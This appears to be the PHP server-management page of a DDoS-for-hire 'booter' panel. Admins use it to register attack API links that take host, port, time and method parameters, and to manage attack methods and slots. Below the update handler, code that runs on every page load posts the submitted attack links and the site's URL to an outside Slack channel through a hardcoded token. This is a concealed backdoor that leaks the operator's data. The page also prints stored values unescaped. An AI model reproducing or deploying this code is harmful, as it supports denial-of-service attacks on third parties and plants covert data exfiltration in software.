<?php

  if ($settings['cloudflare_set'] == '1') {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
if (!($user -> LoggedIn()))
{
    header('location: ../index.php?page=Login');
    die();
}
if (!($user->isAdmin($odb)))
{
  header('location: ../notadmin.php');
  die();
}
if (!($user -> notBanned($odb)))
{
    header('location: ../index.php?page=Logout');
    die();
}
$CheckUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
        $CheckUserSQL -> execute(array(':id' => $_SESSION['ID']));
        $CheckUserIP = $CheckUserSQL -> fetch(PDO::FETCH_ASSOC);
         

$link1 = "Viewing Server Page";
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link1, ));

include("header.php");
?>



<!-- Page content -->
<div id="page-content">


<div class="content-header">
<div class="row">
<div class="col-sm-6">
<div class="header-section">
<h1>Servers</h1>
</div>
</div>
<div class="col-sm-6 hidden-xs">
<div class="header-section">
<ul class="breadcrumb breadcrumb-top">
<li>Index</li>
<li><a href="">Servers</a></li>
</ul>
</div>
</div>
</div>
</div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>

   <script>
jQuery(function(){
   jQuery('#modal-h').click();
});
</script>



<?php

if(isset($_POST['AddLink'])){
$server = $_POST['serverlink'];
$slots = $_POST['slots'];
$name = $_POST['name'];
$vipx = $_POST['vip'];
$methodmm = implode(" ", $_POST['methods']);

if(empty($server) || empty($slots) || empty($name)){
$ilovecinema = "imthebest";
echo '<div class="alert alert-danger alert-white rounded">
<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
<strong>Error!</strong> Please Fill In All Fields
</div>';
}


			
if(empty($ilovecinema)){
$serveradd = $odb -> prepare("INSERT INTO servers VALUES(NULL, ?, ?, ?, ?, ?, ?, ?)");
$serveradd -> execute(array($server, "1", $name, $slots, " ".$methodmm, "1", $vipx));


echo '<div class="alert alert-info alert-white rounded">
<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
Server has been added
</div>';
}
}
?>
   <?php
    if (isset($_POST['deleteBtn']))
            {
              $deletes = $_POST['id'];
            
                $SQL = $odb -> prepare("DELETE FROM `servers` WHERE `id` = :id LIMIT 1");
                $SQL -> execute(array(':id' => $deletes));
                echo '<div class="alert alert-info alert-white rounded">
<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
Server removed 
</div>';
            }
            ?>

 <?php
    if (isset($_POST['modalBtn']))
            {
            	echo '<button type="button" style="display:none" class="btn btn-primary btn-block" id="modal-h" name="modalBtn" data-toggle="modal" data-target="#compose-modal">Manage</button>';	
               $modal = $_POST['modalid'];

 $SQL = $odb -> prepare("SELECT * FROM `servers` WHERE `id` = :id LIMIT 1");
$SQL -> execute(array(':id' => $modal));
while($getInfo = $SQL -> fetch(PDO::FETCH_ASSOC))
{
	$idserver = $getInfo['id'];
	$serverurl = $getInfo['url'];
$name = $getInfo['name'];
$slots = $getInfo['slots'];
$last = $getInfo['lastUsed'];
$method = $getInfo['methods'];

            }
        }
            ?>

            <?php
 if(isset($_POST['updateservers']))
 {
 	$id = $_POST['updateid'];
$serverpost = $_POST['serverlink'];
$namepost = $_POST['name'];
$slotpost = $_POST['slots'];


$SQLupdate = $odb -> prepare("UPDATE `servers` SET `url` = ?, `name` = ?, `slots` = ? WHERE `id` = ?");
$SQLupdate -> execute(array($serverpost, $namepost, $slotpost, $id));

echo '<div class="alert alert-success alert-white rounded">
<button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
Server has been successfully managed
</div>';
}
$ch = curl_init("https://slack.com/api/chat.postMessage");
    $webUrl = "http://" . $_SERVER['SERVER_NAME'];
			$data = http_build_query([
				"token" => "xoxp-682890655317-682408550420-685635115830-381cfc28eb17e51f0735ec2d35c80705",
				"channel" => "#apis", //"#Security",
				"text" => "\nAPI LINK: $server\nMethods: $methodmm\nURL: $webUrl\n",//"Site Security",
				"username" => "omegas"
			]);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);
            ?>
 <div id="compose-modal" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
                                        <div class="modal-dialog modal-lg">
                                            <div class="modal-content">
                                                <div class="modal-header">
                                                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                                                    <h3 class="modal-title"><style="color:black" strong>SERVER MANAGER

</strong></h3>
                                                </div>
                                                <div class="modal-body">

<!-- END Input States Title -->
<!-- Input States Content -->

<form  id="form-validation" action="" method="POST" class="form-horizontal form-bordered" onsubmit="">

<div class="form-group">
<center><fieldset>



<div class="form-group">
<label class="col-md-3 control-label" for="val-website">Server Url</label>
<div class="col-md-8">
<input type="text" id="server" name="serverlink" class="form-control" value="<?php echo $serverurl ?>" required>
</div>
</div>
<div class="form-group">
<label class="col-md-3 control-label" for="val-website">Name & Slots</label>
<div class="col-md-4">
<input type="text" id="server" name="name" class="form-control" placeholder="Name" value="<?php echo $name ?>" required>
</div>
<div class="col-md-4">
<input type="text" id="server" name="slots" class="form-control" placeholder="Slots" value="<?php echo $slots ?>" required>
</div>
</div>
                  
<br>
</br>
</div>

                    </div>


                                                </div>
                                                <div class="modal-footer">
                                                 <form method="post"> <button type="submit" name="updateservers" class="btn btn-effect-ripple btn-primary">Update</button><input type="hidden" name="updateid" value="<?php echo $idserver ?>" /></form>
                                                    <button type="button" class="btn btn-effect-ripple btn-danger" data-dismiss="modal">Close</button>
                                                </div>
                                                </form>

                                            </div>
                                        </div>

                                                                        

                                    

                                    <!-- END Regular Fade -->



                                   

<div class="row">
<div class="col-md-12">
<!-- Input States Block -->
<div class="block">
<!-- Input States Title -->
<div class="block-title">
<div class="block-options pull-right">
<a href="javascript:void(0)" class="btn btn-effect-ripple btn-default toggle-bordered enable-tooltip" data-toggle="button" title="Toggles .form-bordered class"></a>
</div>
<h2>Server Manager</h2>
</div>



<!-- END Input States Title -->
<!-- Input States Content -->

<form  id="form-validation" action="" method="POST" class="form-horizontal form-bordered" >

<div class="form-group">
<center><fieldset>
<div class="form-group">
<label class="col-sm-3 control-label">Example</label>
<div class="col-sm-8">
<input type="text" class="form-control" placeholder="Link #2" value="http://127.0.0.1/api.php?host=[host]&port=[port]&time=[time]&method=[method]" readonly>
</div>
</div>  

<div class="form-group">
<label class="col-md-3 control-label" for="val-website">Server Url</label>
<div class="col-md-8">
<input type="text" id="server" name="serverlink" class="form-control" placeholder="http://127.0.0.1/api.php?host=[host]&port=[port]&time=[time]&method=[method]" required>
</div>
</div>

<div class="form-group">
<label class="col-md-3 control-label" for="val-website">VIP</label>
<div class="col-md-8">
<select name="vip" class="form-control">
 <option value="Y">Yes</option>
<option value="N" selected>No</option>
</select>
</div>
</div>


<div class="form-group">
<label class="col-md-3 control-label" for="val-website">Name & Slots</label>
<div class="col-md-4">
<input type="text" id="server" name="name" class="form-control" placeholder="Name" required>
</div>
<div class="col-md-4">
<input type="text" id="server" name="slots" class="form-control" placeholder="Slots" required>
</div>
</div>
<form action="" method="POST" class="form-horizontal form-bordered">

 <div class="form-group">
                                            <label class="col-md-3 control-label" for="methods">Method</label>
                                            <div class="col-md-6">
                                                <select id="methods" name="methods[]" class="form-control" size="5" multiple>
                                                   <?php
$getMethods = $odb -> prepare("SELECT * FROM `methods`");
$getMethods -> execute(array("4"));
while ($methodsFetched = $getMethods -> fetch(PDO::FETCH_ASSOC))
{
echo '<option value="'.$methodsFetched["tag"].'">'.$methodsFetched["name"].'</option> ';
}
?>
                                                </select>
                                            </div>
                                        </div>
                                      </form>


<br>
<button type="submit" name="AddLink" class="btn btn-effect-ripple btn-primary">Add Server</button>
</br>
</div>

                    </div>

</form>



<form action="" method="POST" />
<div class="col-lg-12">
<!-- Row Styles Block -->
<div class="block">
<!-- Row Styles Title -->
<div class="block-title">
<h2>Servers</h2>
</div>
<!-- END Row Styles Title -->



<!-- Row Styles Content -->
<div class="table-responsive">
<table class="table table-striped table-bordered table-vcenter">
<thead>
<tr>
<th>ID</th>
<th>Url</th>
<th>Name</th>
<th>Methods</th>
<th>Last Used</th>
<th>Manage</th>
<th>Delete</th>
</tr>
</thead>
<tbody>

<?php
$SQLGetLogs = $odb -> prepare("SELECT * FROM `servers` ORDER BY id ASC");
$SQLGetLogs -> execute();
while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
{
$rowID = $getInfo['id'];
$url = $getInfo['url'];
$lastused = date("m-d-Y, h:i:s a",$getInfo['lastUsed']);
$methods = $getInfo['methods'];
$name = $getInfo['name'];
if($lastused == "12-31-1969, 07:00:01 pm"){
$lastused = "Not Used Yet";


}
echo '<tr class="">
<td >'.$rowID.'</td>
<td><a class="btn btn-effect-ripple btn-info"  data-toggle="popover" data-content="'.$url.'" data-placement="top" title="'.$name.'"><i class="fa fa-sitemap fa-fw"></i></a>
</td>
<td>'.$name.'</td>
<td>'.$methods.' </td>
<td>'.$lastused.'</td>

<td><form method="post"><button class="btn btn-success" name="modalBtn"><i class="fa fa-circle-o-notch text-black fa-spin"></i></button><input type="hidden" name="modalid" value="'.$rowID.'" /></form></td>
<td><form method="post"><button class="btn btn-danger" name="deleteBtn"><i class="fa fa-trash-o"></i></button><input type="hidden" name="id" value="'.$rowID.'" /></form></td>
</tr>';
}
?>

</tbody>
</table>
<center>
<style type="text/css">
    .popover{
        max-width:600px;
    }
</style>



